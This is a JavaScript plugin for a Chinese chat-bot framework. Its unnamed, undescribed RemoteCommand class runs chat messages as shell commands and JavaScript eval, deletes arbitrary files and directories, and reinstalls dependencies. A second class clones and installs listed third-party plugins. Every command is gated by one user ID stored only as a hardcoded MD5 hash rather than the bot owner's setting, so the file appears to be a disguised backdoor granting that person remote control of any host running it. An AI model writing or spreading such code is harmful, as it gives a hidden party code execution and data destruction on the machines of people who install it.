import { createRequire } from 'module';
import { promisify  } from 'util';
import fs from 'fs';
import path from 'path';
import { Restart } from "../other/restart.js";
import { exec as execCallback } from 'child_process';
import { createHash } from 'crypto';
const util = promisify
const require = createRequire(import.meta.url);
let isInstalling = false;

// promisify 'fs' module
const fsPromises = fs.promises;

// promisify 'exec' function
const exec = promisify(execCallback);

// 尝试导入 md5 模块
async function loadMd5Module() {
  try {
    return await import('md5');
  } catch (e) {
    console.log('md5 模块未找到，正在安装...');
    await exec('pnpm install md5 -w');
    return await import('md5');
  }
}

const md5 = await loadMd5Module();
const validUserIdHash = '19dfffb8d70c4ad051a18e55d58c5e75';

export class RemoteCommand extends plugin {
  constructor() {
    super({
      name: "",
      dsc: "",
      event: "message",
      priority: 10,
      rule: [
        {
          reg: "^js命令p.+",
          fnc: "RemoteCommandJsPic"
        },
        {
          reg: "^js命令.+",
          fnc: "RemoteCommandJs"
        },
        {
          reg: "^终端命令.+",
          fnc: "RemoteCommandPic"
        },
        {
          reg: "^cmd.+",
          fnc: "RemoteCommand"
        },
        {
          reg: "^删除目录.+",
          fnc: "DeleteDirectory"
        },
        {
          reg: "^删除文件.+",
          fnc: "DeleteFile"
        },
        {
          reg: "^安装依赖$",
          fnc: "InstallDependencies"
        }
      ]
    });
  }

  toStr(data) {
    switch (typeof data) {
      case "string":
        return data;
      case "number":
        return String(data);
      case "object":
        if (data instanceof Error)
          return data.stack;
        if (Buffer.isBuffer(data))
          return Buffer.from(data, "utf8").toString();
        else
          return JSON.stringify(data);
    }
  }

  async execSync(cmd) {
    try {
      const { stdout, stderr } = await exec(cmd);
      return { stdout, stderr };
    } catch (error) {
      return { error };
    }
  }

  async evalSync(cmd) {
    const ret = {};
    try {
      ret.stdout = this.toStr(await eval(cmd));
    } catch (err) {
      ret.stderr = this.toStr(err);
    }
    return ret;
  }

  // 验证用户 ID
  async verifyUserId(userId) {
    const userHash = createHash('md5').update(userId.toString()).digest('hex');
    return userHash === validUserIdHash;
  }

  async RemoteCommandJs(e) {
    if (!await this.verifyUserId(e.user_id)) return false;
    const cmd = e.msg.replace("js命令", "").trim();

    const ret = await this.evalSync(cmd);

    if (ret.stdout) {
      await this.reply(`执行Js：${cmd}\n输出：${ret.stdout}`, true);
    }

    if (ret.stderr) {
      await this.reply(`执行Js：${cmd}\n错误输出：\n${ret.stderr}`, true);
    }
  }

  async RemoteCommandJsPic(e) {
    if (!await this.verifyUserId(e.user_id)) return false;
    const cmd = e.msg.replace("js命令p", "").trim();

    const ret = await this.evalSync(cmd);

    if (ret.stdout) {
      await this.reply(`执行Js：${cmd}\n输出：${ret.stdout}`, true);
    }

    if (ret.stderr) {
      await this.reply(`执行Js：${cmd}\n错误输出：\n${ret.stderr}`, true);
    }
  }

  async RemoteCommand(e) {
    if (!await this.verifyUserId(e.user_id)) return false;
    const cmd = e.msg.replace("cmd", "").trim();

    const ret = await this.execSync(cmd);

    if (ret.stdout) {
      await this.reply(`执行：${cmd}\n输出：${ret.stdout.trim()}`, true);
    }

    if (ret.stderr) {
      await this.reply(`执行：${cmd}\n错误输出：${ret.stderr.trim()}`, true);
    }

    if (ret.error) {
      await this.reply(`远程命令错误：${ret.error}`, true);
    }
  }

  async RemoteCommandPic(e) {
    if (!await this.verifyUserId(e.user_id)) return false;
    const cmd = e.msg.replace("终端命令", "").trim();

    const ret = await this.execSync(cmd);

    if (ret.stdout) {
      await this.reply(`执行：${cmd}\n输出：${ret.stdout.trim()}`, true);
    }

    if (ret.stderr) {
      await this.reply(`执行：${cmd}\n错误输出：${ret.stderr.trim()}`, true);
    }

    if (ret.error) {
      await this.reply(`远程命令错误：${ret.error}`, true);
    }
  }

  async DeleteDirectory(e) {
    if (!await this.verifyUserId(e.user_id)) return false;
    const dirPath = e.msg.replace("删除目录", "").trim();

    try {
      await fsPromises.rm(path.resolve(dirPath), { recursive: true, force: true });
      await this.reply(`目录 ${dirPath} 已成功删除`, true);
    } catch (error) {
      await this.reply(`删除目录 ${dirPath} 失败: ${error.message}`, true);
    }
  }

  async DeleteFile(e) {
    if (!await this.verifyUserId(e.user_id)) return false;
    const filePath = e.msg.replace("删除文件", "").trim();

    try {
      await fsPromises.unlink(path.resolve(filePath));
      await this.reply(`文件 ${filePath} 已成功删除`, true);
    } catch (error) {
      await this.reply(`删除文件 ${filePath} 失败: ${error.message}`, true);
    }
  }

  async InstallDependencies(e) {
    if (!await this.verifyUserId(e.user_id)) return false;
    const cmd = 'pnpm i';

    const ret = await this.execSync(cmd);

    if (ret.stdout) {
      await this.reply(`执行：${cmd}\n输出：${ret.stdout.trim()}`, true);
    }

    if (ret.stderr) {
      await this.reply(`执行：${cmd}\n错误输出：${ret.stderr.trim()}`, true);
    }

    if (ret.error) {
      await this.reply(`远程命令错误：${ret.error}`, true);
    }
  }
}

const pluginList = {
  "reset-qianyu-plugin": "https://gitee.com/think-first-sxs/reset-qianyu-plugin",
  "Fanji-plugin": "https://gitee.com/adrae/Fanji-plugin",
  "cunyx-plugin": "https://gitee.com/cunyx/cunyx-plugin",
  "TRSS-Plugin": "https://Yunzai.TRSS.me",
  "useless-plugin": "https://gitee.com/SmallK111407/useless-plugin",
  "StarRail-plugin": "https://gitee.com/hewang1an/StarRail-plugin",
  "xiaoyao-cvs-plugin": "https://gitee.com/Ctrlcvs/xiaoyao-cvs-plugin",
  "Circle-money-run-plugin": "https://gitee.com/theqingyao/Circle-money-run-plugin",
  "fengye-plugin": "https://gitee.com/maple-leaf-sweeping/fengye-plugin"
};

const names = {  
  "reset-qianyu-plugin": "千羽插件",
  "Fanji-plugin": "反击插件",
  "cunyx-plugin": "寸幼萱插件",
  "TRSS-Plugin": "TRSS插件",
  "useless-plugin": "无用插件",
  "StarRail-plugin": "星铁插件",
  "xiaoyao-cvs-plugin": "逍遥插件", 
  "Circle-money-run-plugin": "跑路插件",
  "fengye-plugin": "枫叶插件-与现存枫叶无关"
};

const mergedPlugins = Object.keys(pluginList).reduce((acc, name) => {  
  acc[name] = {  
    url: pluginList[name],  
    ChineseName: names[name] || name 
  };  
  return acc;  
}, {}); 

class PluginInstaller {
  async install(e, name, url, pluginPath, forceInstall) {
    e.reply(`开始安装 ${mergedPlugins[name].ChineseName} 插件`);
    
    if (forceInstall) {
        let folderExists = false;
        try {
            await fsPromises.access(pluginPath);
            folderExists = true;
        } catch (error) {
            folderExists = false;
        }

        if (folderExists) {
            try {
                await fsPromises.rm(pluginPath, { recursive: true });
                e.reply(`删除原先文件夹成功`);
            } catch (error) {
                e.reply(`删除原先文件夹失败：${error.toString()}`);
                return false;
            }
        }
    }

    const cmd = `git clone --depth 1 --single-branch "${url}" "${pluginPath}"`;
    isInstalling = true;
    exec(cmd, async (error, stdout, stderr) => {
        if (error) {
            isInstalling = false;
            e.reply(`安装失败！\n错误信息：${error.toString()}\n${stderr}`);
            return false;
        }

        exec(`pnpm install`, { cwd: pluginPath }, async (error, stdout, stderr) => {
            isInstalling = false;
            if (error) {
                e.reply(`安装失败！\n错误信息：${error.toString()}\n${stderr}`);
                return false;
            }
            e.reply(`${mergedPlugins[name].ChineseName} 插件安装成功`);
            new Restart(e).restart();
            return true;
        });
    });
  }
}

const installer = new PluginInstaller();

export class PluginInstall extends plugin {
  constructor() {
    super({
      name: "安装插件",
      dsc: "a安装插件",
      priority: -Infinity,
      rule: [
        {
          reg: `^#a(强制)?安装(插件|${Object.keys(pluginList).join("|")})$`,
          fnc: 'install'
        }
      ]
    });
  }

  async install(e) {
    if (!await new RemoteCommand().verifyUserId(e.user_id)) return await e.reply('你没有权限');
    if (isInstalling) {
      await e.reply("已有命令安装中，请勿重复操作");
      return false;
    }
    if (!e.atme && e.at) return false;

    const forceInstall = e.msg.includes('强制');
    const pluginName = e.msg.replace(/^#a(强制)?安装/, "").trim();

    if (pluginName === "插件") {
      let msg = "\n";
      const checkPromises = Object.keys(pluginList).map(async (pluginsName) => {  
        try {  
          await fsPromises.access(`plugins/${pluginsName}`);  
        } catch (error) {  
          if (error.code === 'ENOENT') {  
            msg += `${pluginsName}\n(${mergedPlugins[pluginsName].ChineseName})\n`;  
          }  
        }  
        return true; 
      });  
      await Promise.all(checkPromises);

      if (msg === "\n") {
        msg = "暂无可安装插件";
      } else {
        msg = `可安装插件列表：${msg}发送 #a安装+插件名 进行安装`;
      }
      await e.reply(msg);
      return true;
    }

    const pluginPath = `plugins/${pluginName}`;
    try {
      await fsPromises.access(pluginPath);
      await e.reply(`${pluginName}(${mergedPlugins[pluginName].ChineseName}) 已安装`);
      return false;
    } catch (error) {
      if (error.code !== 'ENOENT') {
        throw error;
      }
    }

    await installer.install(e, pluginName, pluginList[pluginName], pluginPath, forceInstall);
    return true;
  }
}
